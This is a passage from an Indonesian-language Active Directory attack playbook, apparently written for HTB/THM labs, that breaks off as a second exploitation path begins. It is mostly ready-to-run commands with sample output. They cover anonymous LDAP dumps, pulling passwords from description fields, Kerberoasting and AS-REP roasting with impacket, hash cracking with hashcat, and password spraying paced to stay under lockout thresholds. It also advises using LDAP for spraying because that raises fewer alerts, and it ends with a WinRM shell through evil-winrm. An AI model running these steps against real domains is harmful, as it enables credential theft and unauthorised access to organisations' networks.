
text

```
LDAP   10.10.11.200  389  DC01  [*] Windows Server 2019 Standard 17763 (name:DC01) (domain:INLANEFREIGHT.LOCAL)
LDAP   10.10.11.200  389  DC01  [+] INLANEFREIGHT.LOCAL\: (Guest/Null Bind Success!)
```

➡️ **ANONYMOUS BIND OPEN!** Ini situasi terbaik. Langsung ke **FASE 2 — Full Domain Dump**.

**OUTPUT GAGAL ❌ — Anonymous Bind DITOLAK (Default modern AD):**

text

```
ldap_search_ext: Operations error (1)
additional info: 000004DC: LdapErr: DSID-0C090A4C, comment: In order to 
perform this operation a successful bind must be completed on the connection.
```

Atau dari nxc:

text

```
LDAP   10.10.11.200  389  DC01  [-] INLANEFREIGHT.LOCAL\: STATUS_ACCESS_DENIED
```

➡️ Anonymous diblokir. Tapi kamu masih bisa:

1. Coba `guest` account (kadang diaktifkan):

Bash

```
nxc ldap $TARGET -u 'guest' -p '' --shares
ldapsearch -x -H ldap://$TARGET -D "guest@$DOMAIN" -w "" -b "$BASE_DN" "(objectClass=user)" sAMAccountName
```

2. Cari credentials dari service lain → ke **FASE 5** (butuh creds dari SMB/web/dll)
3. Lanjut ke **Langkah 1.2** untuk info yang tetap bisa diambil

**OUTPUT BERBEDA ❌ — Size limit exceeded:**

text

```
ldap_search_ext: Size limit exceeded (4)
# numResponses: 1001
```

➡️ Query berhasil tapi output terpotong! Tambahkan paging:

Bash

```
ldapsearch -x -H ldap://$TARGET -b "$BASE_DN" -E pr=1000/noprompt "(objectClass=*)" dn
```

---

### Langkah 1.2 — RootDSE Info (Selalu Bisa Diambil Meski Anonymous Ditolak)

Bash

```
# Ini SELALU berhasil bahkan tanpa anonymous bind
# Karena RootDSE adalah public entry LDAP protocol
ldapsearch -x -H ldap://$TARGET -s base -b "" "(objectClass=*)" \
    defaultNamingContext dnsHostName domainFunctionality 2>/dev/null

# Nmap alternative
nmap -p 389 --script ldap-rootdse $TARGET -oN ~/ldap_loot/rootdse.txt
```

**OUTPUT BERHASIL ✅:**

text

```
dn:
defaultNamingContext: DC=inlanefreight,DC=local
dnsHostName: DC01.inlanefreight.local
domainFunctionality: 7
```

➡️ Minimal kamu sudah dapat:

- **Base DN** → untuk semua query berikutnya
- **DC Hostname** → tambah ke /etc/hosts
- **Functional Level** → petunjuk OS version

**Lanjut ke FASE 2 (jika anon berhasil) atau FASE 5 (jika butuh creds).**

---

## ═══════════════════════════════════════

## FASE 2: FULL DOMAIN DUMP (ANONYMOUS BIND OPEN)

## ═══════════════════════════════════════

> **Masuk sini jika:** Langkah 1.1 berhasil dengan anonymous/guest bind.  
> **Tujuan:** Ekstrak SEMUA informasi AD yang bisa diakses — users, groups, computers, SPNs, deskripsi.

### Langkah 2.1 — Automated Dump dengan ldapdomaindump (PALING EFISIEN)

Bash

```
# Command 1: Anonymous dump — SATU command, output HTML + JSON + TSV
ldapdomaindump ldap://$TARGET -u "" -p "" -o ~/ldap_loot/dump/

# Command 2: Jika anonymous gagal tapi punya creds
ldapdomaindump ldap://$TARGET -u "$DOMAIN\\$USER" -p "$PASS" -o ~/ldap_loot/dump/

# Command 3: Lihat hasil dump
ls -la ~/ldap_loot/dump/
```

**OUTPUT BERHASIL ✅:**

text

```
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Got 45 users
[+] Got 23 groups
[+] Got 15 computers
[+] Got 3 policy objects
[*] Enumeration done!
```

➡️ Buka file hasil:

Bash

```
# Lihat users dengan deskripsi (PRIORITAS!)
cat ~/ldap_loot/dump/domain_users.json | python3 -m json.tool | grep -A3 "description"

# Lihat file HTML di browser (jika ada GUI)
firefox ~/ldap_loot/dump/domain_users.html &

# Atau parse via CLI
cat ~/ldap_loot/dump/domain_users.grep | column -t | head -50
```

**File yang dihasilkan dan cara bacanya:**

|File|Isi|Cara Gunakan|
|---|---|---|
|`domain_users.html`|Tabel semua user + deskripsi + timestamps|Buka di browser, cari kolom description|
|`domain_users.grep`|Format grep-friendly|`grep -i "pass\|temp\|welcome"`|
|`domain_groups.html`|Membership semua grup|Cari Domain Admins members|
|`domain_computers.html`|OS version semua komputer|Cari Windows version untuk exploit|
|`domain_trusts.html`|Trust relationships|Petunjuk forest/domain lain|

**OUTPUT GAGAL ❌ — ldapdomaindump tidak terinstall:**

text

```
bash: ldapdomaindump: command not found
```

➡️ Install dan retry:

Bash

```
pip3 install ldapdomaindump --break-system-packages
# atau
sudo apt install python3-ldap3 -y
ldapdomaindump ldap://$TARGET -u "" -p "" -o ~/ldap_loot/dump/
```

---

### Langkah 2.2 — Manual Ekstraksi Users (Targeted & Reliable)

Bash

```
# Command 1: Dump semua user + simpan ke file bersih
ldapsearch -x -H ldap://$TARGET -b "$BASE_DN" \
    "(&(objectClass=user)(objectCategory=person))" \
    sAMAccountName userPrincipalName description \
    -E pr=1000/noprompt 2>/dev/null \
    > ~/ldap_loot/users/users_full.ldif

# Extract clean username list
grep "^sAMAccountName:" ~/ldap_loot/users/users_full.ldif \
    | awk '{print $2}' | sort -u \
    > ~/ldap_loot/users/users.txt

# Verifikasi
echo "[*] Total users found: $(wc -l < ~/ldap_loot/users/users.txt)"
cat ~/ldap_loot/users/users.txt
```

**OUTPUT BERHASIL ✅:**

text

```
[*] Total users found: 23
Administrator
Guest
krbtgt
r.thompson
s.connors
j.wilson
svc_backup
svc_mssql
hhogan
...
```

➡️ Simpan users.txt — akan dipakai untuk **password spraying** di Fase 6.

Bash

```
# Command 2: Hanya ambil ACTIVE users (skip disabled)
ldapsearch -x -H ldap://$TARGET -b "$BASE_DN" \
    "(&(objectClass=user)(objectCategory=person)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))" \
    sAMAccountName -E pr=1000/noprompt 2>/dev/null \
    | grep "^sAMAccountName:" | awk '{print $2}' \
    > ~/ldap_loot/users/active_users.txt

echo "[*] Active users: $(wc -l < ~/ldap_loot/users/active_users.txt)"
```

---

### Langkah 2.3 — PRIORITAS 1: Cek Password di Field Description ⚠️

> **Kenapa ini KRITIS?** Helpdesk admin sering tulis temporary password di kolom Description. Di HTB/THM, ini adalah initial access vector paling umum dari LDAP.

Bash

```
# Command 1: Query spesifik users yang punya deskripsi
ldapsearch -x -H ldap://$TARGET -b "$BASE_DN" \
    "(&(objectClass=user)(description=*))" \
    sAMAccountName description \
    -E pr=1000/noprompt 2>/dev/null

# Command 2: Filter langsung yang mengandung keyword password
ldapsearch -x -H ldap://$TARGET -b "$BASE_DN" \
    "(&(objectClass=user)(description=*))" \
    sAMAccountName description 2>/dev/null \
    | grep -E "(sAMAccountName|description):" \
    | grep -B1 -iE "pass|pwd|temp|welcome|login|cred|secret|key"

# Command 3: Cek juga field "comment" (sering diabaikan)
ldapsearch -x -H ldap://$TARGET -b "$BASE_DN" \
    "(&(objectClass=user)(comment=*))" \
    sAMAccountName comment 2>/dev/null
```

**OUTPUT BERHASIL ✅ — Password Ketemu di Description (JACKPOT!):**

text

```
dn: CN=Ryan Thompson,OU=IT,DC=cascade,DC=local
sAMAccountName: r.thompson
description: Temp password for onboarding: Casc@de2020!

dn: CN=Helpdesk Tech,OU=IT,DC=inlanefreight,DC=local
sAMAccountName: hdesk_svc
description: Password reset on 12/04/2023 to WelcomeToCorp123!
```

➡️ **SIMPAN CREDENTIALS LANGSUNG:**

Bash

```
export USER="r.thompson"
export PASS="Casc@de2020!"
echo "$USER:$PASS" >> ~/ldap_loot/creds/found_creds.txt

# Validasi SEGERA ke semua service yang mungkin aktif
nxc smb $TARGET -u "$USER" -p "$PASS"
nxc winrm $TARGET -u "$USER" -p "$PASS"
nxc ldap $TARGET -u "$USER" -p "$PASS"
```

➡️ Setelah validasi → ke **FASE 4 (Authenticated LDAP Enum)** atau **Fase Exploitation**.

**OUTPUT BERHASIL ✅ — Description ter-encode Base64:**

text

```
description:: VGVtcFBhc3MxMjMh
```

(Perhatikan `::` dua titik dua = Base64 encoded!)

➡️ Decode langsung:

Bash

```
echo "VGVtcFBhc3MxMjMh" | base64 -d
# Output: TempPass123!
```

**OUTPUT ❌ — Tidak ada deskripsi yang menarik:**

text

```
# numEntries: 0
# (atau hanya deskripsi generik seperti "Built-in administrator account")
```

➡️ Lanjut ke Langkah 2.4.

---

### Langkah 2.4 — Ekstraksi Security Groups & High-Value Members

Bash

```
# Command 1: List semua grup
ldapsearch -x -H ldap://$TARGET -b "$BASE_DN" \
    "(objectClass=group)" cn description \
    -E pr=1000/noprompt 2>/dev/null \
    | grep -E "^(cn|description):" | head -60

# Command 2: Anggota Domain Admins (TARGET UTAMA)
ldapsearch -x -H ldap://$TARGET -b "$BASE_DN" \
    "(&(objectClass=group)(cn=Domain Admins))" member 2>/dev/null

# Command 3: Anggota Remote Management Users (WinRM access)
ldapsearch -x -H ldap://$TARGET -b "$BASE_DN" \
    "(&(objectClass=group)(cn=Remote Management Users))" member 2>/dev/null

# Command 4: Anggota Enterprise Admins (Forest-level admin)
ldapsearch -x -H ldap://$TARGET -b "$BASE_DN" \
    "(&(objectClass=group)(cn=Enterprise Admins))" member 2>/dev/null
```

**OUTPUT BERHASIL ✅:**

text

```
dn: CN=Domain Admins,CN=Users,DC=inlanefreight,DC=local
member: CN=Administrator,CN=Users,DC=inlanefreight,DC=local
member: CN=svc_admin,OU=Service Accounts,DC=inlanefreight,DC=local

dn: CN=Remote Management Users,CN=Builtin,DC=inlanefreight,DC=local
member: CN=Ryan Thompson,OU=IT,DC=inlanefreight,DC=local
```

➡️ Catat semua member Domain Admins dan Remote Management Users — ini target prioritas untuk credential reuse dan exploitation.

---

### Langkah 2.5 — Ekstraksi Computer Objects (Peta Target Internal)

Bash

```
# Dump semua komputer di domain
ldapsearch -x -H ldap://$TARGET -b "$BASE_DN" \
    "(objectClass=computer)" \
    dNSHostName operatingSystem operatingSystemVersion \
    -E pr=1000/noprompt 2>/dev/null \
    | grep -E "^(dNSHostName|operatingSystem):" \
    | tee ~/ldap_loot/computers.txt

# Tambah semua komputer ke /etc/hosts
ldapsearch -x -H ldap://$TARGET -b "$BASE_DN" \
    "(objectClass=computer)" dNSHostName 2>/dev/null \
    | grep "^dNSHostName:" | awk '{print $2}' \
    | while read host; do
        echo "# $host" >> ~/ldap_loot/computers_hosts.txt
      done
```

**OUTPUT BERHASIL ✅:**

text

```
dNSHostName: DC01.inlanefreight.local
operatingSystem: Windows Server 2019 Standard

dNSHostName: SQL01.inlanefreight.local
operatingSystem: Windows Server 2016 Standard

dNSHostName: WS-DEV-14.inlanefreight.local
operatingSystem: Windows 10 Enterprise
```

**Cara baca untuk pentest:**

|OS|Arti|Tindakan|
|---|---|---|
|`Windows Server 2008 R2`|Legacy! Unpatched kemungkinan|Cek MS17-010, PrintNightmare|
|`Windows Server 2016/2019`|Modern tapi masih ada vuln|Fokus ke misconfig, delegation|
|`Windows 10/11 Enterprise`|Workstation user|Target untuk phishing / credential harvest|
|Komputer dengan nama menarik (SQL01, BACKUP01)|High-value target|Enumerasi service spesifik → ke file 14b|

---

## ═══════════════════════════════════════

## FASE 3: KERBEROS ATTACK ENUMERATION VIA LDAP

## ═══════════════════════════════════════

> **Tujuan:** Identifikasi akun yang vulnerable terhadap Kerberoasting dan AS-REP Roasting langsung dari LDAP query — bahkan tanpa credentials (jika anonymous bind open).

### Langkah 3.1 — SPN Enumeration (Target Kerberoasting)

> **Konsep:** Akun user yang punya `servicePrincipalName` = bisa di-Kerberoast. Siapapun yang sudah authenticated bisa minta TGS ticket untuk SPN ini, lalu crack offline.

Bash

```
# Command 1: Filter SPN accounts via LDAP (anonymous atau authenticated)
ldapsearch -x -H ldap://$TARGET -b "$BASE_DN" \
    "(&(objectClass=user)(servicePrincipalName=*)(!(objectClass=computer)))" \
    sAMAccountName servicePrincipalName \
    -E pr=1000/noprompt 2>/dev/null

# Command 2: Khusus MSSQL SPN (sering punya privilege tinggi)
ldapsearch -x -H ldap://$TARGET -b "$BASE_DN" \
    "(&(servicePrincipalName=MSSQL*)(!(objectClass=computer)))" \
    sAMAccountName servicePrincipalName 2>/dev/null

# Command 3: Dengan windapsearch (jika sudah punya creds)
python3 /opt/windapsearch/windapsearch.py \
    -d $DOMAIN --dc-ip $TARGET \
    --spns
```

**OUTPUT BERHASIL ✅ — SPN accounts ditemukan:**

text

```
dn: CN=SQL Service,OU=Service Accounts,DC=inlanefreight,DC=local
sAMAccountName: svc_mssql
servicePrincipalName: MSSQLSvc/SQL01.inlanefreight.local:1433

dn: CN=HTTP Service,OU=Service Accounts,DC=inlanefreight,DC=local
sAMAccountName: svc_http
servicePrincipalName: HTTP/intranet.inlanefreight.local
```

➡️ **SIMPAN dan langsung Kerberoast** (butuh minimal 1 creds valid):

Bash

```
# Simpan SPN user list
echo "svc_mssql" >> ~/ldap_loot/creds/spn_accounts.txt
echo "svc_http" >> ~/ldap_loot/creds/spn_accounts.txt

# Jika sudah punya credentials → Kerberoast sekarang
impacket-GetUserSPNs "$DOMAIN/$USER:$PASS" \
    -dc-ip $TARGET \
    -request \
    -outputfile ~/ldap_loot/hashes/kerberoast_hashes.txt

# Crack hash
hashcat -m 13100 ~/ldap_loot/hashes/kerberoast_hashes.txt \
    /usr/share/wordlists/rockyou.txt \
    -o ~/ldap_loot/hashes/kerberoast_cracked.txt

# Lihat hasil
cat ~/ldap_loot/hashes/kerberoast_cracked.txt
```

**OUTPUT BERHASIL ✅ — Hash di-crack:**

text

```
$krb5tgs$23$*svc_mssql*...:P@ssw0rd_SQL2024
```

➡️ **Simpan dan test credentials:**

Bash

```
export USER="svc_mssql"
export PASS="P@ssw0rd_SQL2024"
echo "$USER:$PASS" >> ~/ldap_loot/creds/found_creds.txt

# Test ke service yang relevan
nxc mssql $TARGET -u "$USER" -p "$PASS"    # → ke <a href="/docs/mssql" class="text-[#00b4d8] hover:underline font-mono font-semibold">14b_mssql_workflow.md</a>
nxc smb $TARGET -u "$USER" -p "$PASS"
nxc winrm $TARGET -u "$USER" -p "$PASS"
```

**OUTPUT GAGAL ❌ — Tidak ada SPN accounts:**

text

```
# numEntries: 0
```

➡️ Tidak ada akun untuk Kerberoasting. Lanjut ke Langkah 3.2.

---

### Langkah 3.2 — AS-REP Roasting Candidates (DONT_REQUIRE_PREAUTH)

> **Konsep:** Akun dengan flag `DONT_REQ_PREAUTH` aktif = bisa minta TGT **tanpa password**. Server KDC langsung kirim hash yang bisa di-crack offline.

Bash

```
# Command 1: Filter via LDAP bitwise query (UAC bit 4194304)
ldapsearch -x -H ldap://$TARGET -b "$BASE_DN" \
    "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
    sAMAccountName userAccountControl \
    -E pr=1000/noprompt 2>/dev/null

# Command 2: windapsearch (lebih mudah)
python3 /opt/windapsearch/windapsearch.py \
    -d $DOMAIN --dc-ip $TARGET \
    --asreproastable

# Command 3: Langsung AS-REP Roast via Impacket (tanpa perlu tahu user dulu)
impacket-GetNPUsers "$DOMAIN/" \
    -usersfile ~/ldap_loot/users/users.txt \
    -format hashcat \
    -output ~/ldap_loot/hashes/asrep_hashes.txt \
    -dc-ip $TARGET \
    -no-pass
```

**OUTPUT BERHASIL ✅ — AS-REP Roasting candidate ditemukan via LDAP:**

text

```
dn: CN=Hulk Hogan,OU=Employees,DC=inlanefreight,DC=local
sAMAccountName: hhogan
userAccountControl: 4194816
```

(`4194816` = `512` NORMAL_ACCOUNT + `4194304` DONT_REQ_PREAUTH)

**OUTPUT BERHASIL ✅ — Hash berhasil didapat via GetNPUsers:**

text

```
[*] Getting TGT for sebastien
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[*] Getting TGT for hhogan
[+] Got TGT for hhogan!
$krb5asrep$23$hhogan@INLANEFREIGHT.LOCAL:a1b2c3...
```

➡️ **Crack hash:**

Bash

```
# Hashcat mode 18200 untuk AS-REP hash
hashcat -m 18200 ~/ldap_loot/hashes/asrep_hashes.txt \
    /usr/share/wordlists/rockyou.txt \
    -o ~/ldap_loot/hashes/asrep_cracked.txt

# Coba dengan rules jika gagal dengan wordlist biasa
hashcat -m 18200 ~/ldap_loot/hashes/asrep_hashes.txt \
    /usr/share/wordlists/rockyou.txt \
    -r /usr/share/hashcat/rules/best64.rule

# John sebagai alternatif
john ~/ldap_loot/hashes/asrep_hashes.txt \
    --wordlist=/usr/share/wordlists/rockyou.txt \
    --format=krb5asrep
```

**OUTPUT BERHASIL ✅ — Hash cracked:**

text

```
$krb5asrep$23$hhogan@INLANEFREIGHT.LOCAL:...:Hulkamania1!
```

➡️ Login dengan credentials baru:

Bash

```
export USER="hhogan"
export PASS="Hulkamania1!"
echo "$USER:$PASS" >> ~/ldap_loot/creds/found_creds.txt

# Test ke semua service
nxc winrm $TARGET -u "$USER" -p "$PASS"
nxc smb $TARGET -u "$USER" -p "$PASS"
evil-winrm -i $TARGET -u "$USER" -p "$PASS"
```

**OUTPUT GAGAL ❌ — Tidak ada AS-REP candidates:**

text

```
[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User guest doesn't have UF_DONT_REQUIRE_PREAUTH set
# (semua user return [-])
```

➡️ Tidak ada AS-REP Roasting target. Lanjut ke **FASE 4** atau **FASE 6**.

**OUTPUT GAGAL ❌ — hashcat tidak bisa crack:**

text

```
Status: Exhausted
Recovered: 0/1 hashes
```

➡️ Coba wordlist lebih besar:

Bash

```
# Coba SecLists
hashcat -m 18200 ~/ldap_loot/hashes/asrep_hashes.txt \
    /usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt

# Coba kombinasi rules
hashcat -m 18200 ~/ldap_loot/hashes/asrep_hashes.txt \
    /usr/share/wordlists/rockyou.txt \
    -r /usr/share/hashcat/rules/d3ad0ne.rule

# Simpan hash untuk nanti, lanjutkan workflow
# → Google search: "hashcat krb5asrep 18200 wordlist" untuk wordlist tambahan
```

---

### Langkah 3.3 — AdminSDHolder Protected Accounts (adminCount=1)

Bash

```
# Cari semua high-privilege accounts
ldapsearch -x -H ldap://$TARGET -b "$BASE_DN" \
    "(&(objectClass=user)(adminCount=1))" \
    sAMAccountName memberOf \
    -E pr=1000/noprompt 2>/dev/null
```

**OUTPUT BERHASIL ✅:**

text

```
sAMAccountName: Administrator
memberOf: CN=Domain Admins,CN=Users,DC=inlanefreight,DC=local

sAMAccountName: svc_admin
memberOf: CN=Domain Admins,CN=Users,DC=inlanefreight,DC=local

sAMAccountName: backup_operator
memberOf: CN=Backup Operators,CN=Builtin,DC=inlanefreight,DC=local
```

➡️ Catat semua akun ini — mereka adalah target spraying/cracking **tertinggi prioritasnya**.

---

## ═══════════════════════════════════════

## FASE 4: AUTHENTICATED LDAP ENUMERATION

## ═══════════════════════════════════════

> **Masuk sini jika:** Sudah punya credentials valid (dari FASE 2, FASE 3, atau dari service lain seperti SMB/FTP).

### Langkah 4.1 — Validasi Credentials via LDAP

Bash

```
# Command 1: NetExec LDAP — paling cepat, langsung validasi
nxc ldap $TARGET -u "$USER" -p "$PASS"

# Command 2: ldapsearch dengan bind resmi
ldapsearch -x -H ldap://$TARGET \
    -D "$USER@$DOMAIN" \
    -w "$PASS" \
    -b "$BASE_DN" \
    "(objectClass=user)" sAMAccountName \
    -s sub -z 1 dn 2>/dev/null
```

**OUTPUT BERHASIL ✅ — Credentials valid:**

text

```
LDAP   10.10.11.200  389  DC01  [+] INLANEFREIGHT.LOCAL\r.thompson:Casc@de2020!
```

**OUTPUT GAGAL ❌ — Invalid credentials:**

text

```
LDAP   10.10.11.200  389  DC01  [-] INLANEFREIGHT.LOCAL\r.thompson:wrongpass LDAP Error: invalidCredentials
```

➡️ Password salah. Cek:

Bash

```
# Apakah username perlu format berbeda?
nxc ldap $TARGET -u "r.thompson" -p "$PASS"      # format username saja
nxc ldap $TARGET -u "$DOMAIN\\$USER" -p "$PASS"  # format domain\user
nxc ldap $TARGET -u "$USER@$DOMAIN" -p "$PASS"   # format UPN

# Mungkin password perlu di-escape
# Jika password ada karakter spesial: ' " ! $ gunakan single quote
nxc ldap $TARGET -u "$USER" -p 'P@$$w0rd!'
```

**OUTPUT GAGAL ❌ — STATUS_PASSWORD_MUST_CHANGE:**

text

```
LDAP   10.10.11.200  389  DC01  [-] STATUS_PASSWORD_MUST_CHANGE
```

➡️ User wajib ganti password saat first login:

Bash

```
smbpasswd -r $TARGET -U $USER
# Masukkan old password, lalu set new password
# Setelah berhasil, gunakan password baru untuk login
```

---

### Langkah 4.2 — Full Authenticated Dump (BloodHound + ldapdomaindump)

Bash

```
# Command 1: ldapdomaindump dengan credentials (PALING LENGKAP)
ldapdomaindump ldap://$TARGET \
    -u "$DOMAIN\\$USER" \
    -p "$PASS" \
    -o ~/ldap_loot/dump/

# Command 2: BloodHound collection via LDAP (untuk graph analysis)
bloodhound-python \
    -u "$USER" \
    -p "$PASS" \
    -d "$DOMAIN" \
    -dc "$TARGET" \
    -c All \
    --zip \
    -o ~/ldap_loot/bloodhound/

# Command 3: Cek password policy (WAJIB sebelum spraying)
nxc ldap $TARGET -u "$USER" -p "$PASS" --pass-pol
```

**OUTPUT BERHASIL ✅ — Password Policy:**

text

```
Account Lockout Threshold: 5        ← Maksimal 4 attempt sebelum lock!
Account Lockout Duration: 30 mins
Reset Account Lockout After: 30 mins
Minimum Password Length: 8
```

**Aturan spraying berdasarkan Lockout Threshold:**

|Threshold|Strategi Aman|
|---|---|
|`0` (unlimited)|Bebas spray, tidak ada lockout|
|`3`|Hanya 2 password per session, tunggu 35 menit|
|`5`|Maksimal 4 password per session, tunggu 35 menit|
|`10+`|5-7 password per session|
|Tidak bisa cek|Asumsikan threshold=3, **sangat hati-hati**|

**OUTPUT BERHASIL ✅ — BloodHound data collected:**

text

```
INFO: Found AD domain: inlanefreight.local
INFO: Getting TGT for user
INFO: Connecting to LDAP server: DC01.inlanefreight.local
INFO: Found 1 domains
INFO: Found 1 domain controllers
INFO: Found 45 computers
INFO: Found 89 users
INFO: Found 23 groups
INFO: Compressing output into 20240101120000_BloodHound.zip
```

➡️ Import zip ke BloodHound GUI:

Bash

```
# Start BloodHound (jika belum running)
sudo neo4j start
bloodhound &
# Drag & drop file zip ke BloodHound GUI
# Atau: Database Info → Upload Data → pilih zip
```

➡️ Query penting di BloodHound:

- "Shortest Paths to Domain Admins"
- "Find All Domain Admins"
- "Users with DCSync Rights"
- "Computers with Unconstrained Delegation"

**→ Setelah BloodHound: lanjut ke [🩸 36 — Active Directory BloodHound Workflow](/docs/ad-bloodhound)**

---

### Langkah 4.3 — Targeted Authenticated Queries

Bash

```
# Cek delegation configurations (high-value attack surface)

# Unconstrained Delegation (TRUSTED_FOR_DELEGATION)
ldapsearch -x -H ldap://$TARGET \
    -D "$USER@$DOMAIN" -w "$PASS" \
    -b "$BASE_DN" \
    "(userAccountControl:1.2.840.113556.1.4.803:=524288)" \
    sAMAccountName userAccountControl 2>/dev/null

# Constrained Delegation
ldapsearch -x -H ldap://$TARGET \
    -D "$USER@$DOMAIN" -w "$PASS" \
    -b "$BASE_DN" \
    "(msDS-AllowedToDelegateTo=*)" \
    sAMAccountName "msDS-AllowedToDelegateTo" 2>/dev/null
```

**OUTPUT BERHASIL ✅ — Unconstrained Delegation ditemukan:**

text

```
sAMAccountName: DC01$
userAccountControl: 532480   ← Domain Controller (normal, skip)

sAMAccountName: BACKUP01$
userAccountControl: 528384   ← Komputer dengan Unconstrained Delegation!
```

➡️ Komputer dengan Unconstrained Delegation bisa digunakan untuk **Printer Bug / Coercion attack** → ke **<a href="/docs/ad-delegation" class="text-[#00b4d8] hover:underline font-mono font-semibold">39_ad_delegation_workflow.md</a>**

**OUTPUT BERHASIL ✅ — Constrained Delegation:**

text

```
sAMAccountName: svc_iis
msDS-AllowedToDelegateTo: HTTP/intranet.inlanefreight.local
```

➡️ → ke **<a href="/docs/ad-delegation" class="text-[#00b4d8] hover:underline font-mono font-semibold">39_ad_delegation_workflow.md</a>** untuk S4U2Proxy exploitation.

---

## ═══════════════════════════════════════

## FASE 5: LDAP PASSWORD SPRAYING

## ═══════════════════════════════════════

> **Masuk sini jika:** Anonymous bind ditolak, belum punya credentials, tapi sudah punya user list dari Phase 2 atau RootDSE.

### Langkah 5.1 — Cek Password Policy DULU (WAJIB!)

Bash

```
# Jika belum ada creds sama sekali, coba anonymous
nxc ldap $TARGET -u '' -p '' --pass-pol 2>/dev/null

# Atau via rpcclient (kadang bisa null session)
rpcclient -U "" -N $TARGET -c "getdompwinfo" 2>/dev/null

# Atau via Nmap NSE
nmap -p 389 --script ldap-search \
    --script-args 'ldap.base="DC=inlanefreight,DC=local"' \
    $TARGET
```

**OUTPUT BERHASIL ✅ — Policy didapat:**

text

```
Account Lockout Threshold: 0    ← TIDAK ADA LOCKOUT! Bebas spray!
```

➡️ Threshold = 0? Bebas spray dengan banyak password.  
➡️ Threshold > 0? Ikuti aturan di tabel Langkah 4.2.

---

### Langkah 5.2 — Buat Password List Kontekstual

Bash

```
# Buat password list berdasarkan konteks target
cat > ~/ldap_loot/creds/spray_passwords.txt << 'EOF'
Password123!
Welcome2024!
Welcome2023!
Summer2024!
Winter2024!
Company2024!
Admin2024!
P@ssw0rd
Passw0rd!
EOF

# Tambahkan nama domain/perusahaan sebagai kandidat
COMPANY=$(echo $DOMAIN | cut -d'.' -f1)
echo "${COMPANY}2024!" >> ~/ldap_loot/creds/spray_passwords.txt
echo "${COMPANY}@2024" >> ~/ldap_loot/creds/spray_passwords.txt
echo "$(echo $COMPANY | sed 's/.*/\u&/')2024!" >> ~/ldap_loot/creds/spray_passwords.txt

# Lihat hasilnya
cat ~/ldap_loot/creds/spray_passwords.txt
```

---

### Langkah 5.3 — Execute Password Spraying via LDAP

> **Kenapa LDAP lebih baik dari Kerberos untuk spray?** LDAP menghasilkan event 4625 yang lebih jarang di-alert daripada event 4771 dari Kerberos.

Bash

```
# Command utama: NetExec LDAP spray
nxc ldap $TARGET \
    -u ~/ldap_loot/users/users.txt \
    -p ~/ldap_loot/creds/spray_passwords.txt \
    --continue-on-success \
    | tee ~/ldap_loot/creds/spray_results.txt

# Filter yang berhasil
grep "\[+\]" ~/ldap_loot/creds/spray_results.txt
```

**OUTPUT BERHASIL ✅ — Credentials ditemukan:**

text

```
LDAP   10.10.11.200  389  DC01  [+] INLANEFREIGHT.LOCAL\s.connors:Welcome2024!
```

➡️ Simpan dan langsung validasi:

Bash

```
export USER="s.connors"
export PASS="Welcome2024!"
echo "$USER:$PASS" >> ~/ldap_loot/creds/found_creds.txt

# Cek privilege level
nxc smb $TARGET -u "$USER" -p "$PASS"
nxc winrm $TARGET -u "$USER" -p "$PASS"
```

**OUTPUT GAGAL ❌ — Account Locked Out:**

text

```
LDAP   10.10.11.200  389  DC01  [-] INLANEFREIGHT.LOCAL\clark:Password123! STATUS_ACCOUNT_LOCKED_OUT
```

➡️ **STOP SPRAY SEKARANG!** Beberapa akun terkunci:

Bash

```
# Cek berapa lama harus tunggu
rpcclient -U "$USER" -W $DOMAIN $TARGET -c "getdompwinfo" 2>/dev/null \
    | grep "lockout"

# Tunggu waktu reset + 5 menit buffer
# Lanjut spray dengan SATU password saja per session
sleep 1800  # tunggu 30 menit
nxc ldap $TARGET -u ~/ldap_loot/users/users.txt -p 'Password1' --continue-on-success
```

**OUTPUT GAGAL ❌ — Semua LOGON_FAILURE:**

text

```
LDAP   10.10.11.200  389  DC01  [-] INLANEFREIGHT.LOCAL\s.connors:Password123! LDAP Error: invalidCredentials
LDAP   10.10.11.200  389  DC01  [-] INLANEFREIGHT.LOCAL\s.connors:Welcome2024! LDAP Error: invalidCredentials
```

➡️ Password list tidak cocok. Strategi lain:

Bash

```
# Opsi 1: Spray dengan seasonal passwords (lebih umum)
for season in Spring Summer Fall Winter; do
    for year in 2022 2023 2024; do
        echo "${season}${year}!" >> ~/ldap_loot/creds/seasonal.txt
        echo "${season}${year}@" >> ~/ldap_loot/creds/seasonal.txt
    done
done
nxc ldap $TARGET -u ~/ldap_loot/users/users.txt -p ~/ldap_loot/creds/seasonal.txt --continue-on-success

# Opsi 2: Username-as-password (admin lupa set password)
nxc ldap $TARGET -u ~/ldap_loot/users/users.txt -p ~/ldap_loot/users/users.txt --no-bruteforce --continue-on-success

# Opsi 3: Blank password
nxc ldap $TARGET -u ~/ldap_loot/users/users.txt -p '' --continue-on-success
```

---

## ═══════════════════════════════════════

## FASE 6: EXPLOITATION PATHS

## ═══════════════════════════════════════

### PATH A — Anonymous LDAP → Password in Description → WinRM Shell

> Chain paling umum di HTB (Cascade, Sauna style)

Bash

```
# LANGKAH A1: Ekstrak password dari description
ldapsearch -x -H ldap://$TARGET -b "$BASE_DN" \
    "(&(objectClass=user)(description=*))" \
    sAMAccountName description 2>/dev/null \
    | grep -E "(sAMAccountName|description):"

# LANGKAH A2: Decode jika Base64
# Contoh: description:: VGVtcFBhc3MxMjMh
echo "VGVtcFBhc3MxMjMh" | base64 -d

# LANGKAH A3: Validasi ke WinRM (port 5985)
nxc winrm $TARGET -u "$USER" -p "$PASS"
```

**OUTPUT BERHASIL ✅ — Pwn3d!:**

text

```
WINRM  10.10.11.200  5985  DC01  [+] INLANEFREIGHT.LOCAL\r.thompson:Casc@de2020! (Pwn3d!)
```

➡️ Spawn shell:

Bash

```
evil-winrm -i $TARGET -u "$USER" -p "$PASS"

# Di dalam evil-winrm:
*Evil-WinRM* PS> whoami
inlanefreight\r.thompson
*Evil-WinRM* PS> whoami /priv
# Cek privilege → ke <a href="/docs/windows-privesc" class="text-[#00b4d8] hover:underline font-mono font-semibold">45_windows_privesc_workflow.md</a>
*Evil-WinRM* PS> Get-ADUser -Filter * -Properties * | Select Name,Description | Where Description -ne $null
# Cari lebih banyak password di AD
```

---

### PATH B — User Enum → AS-REP Roasting → Foothold

> Chain HTB Forest style

Bash

```
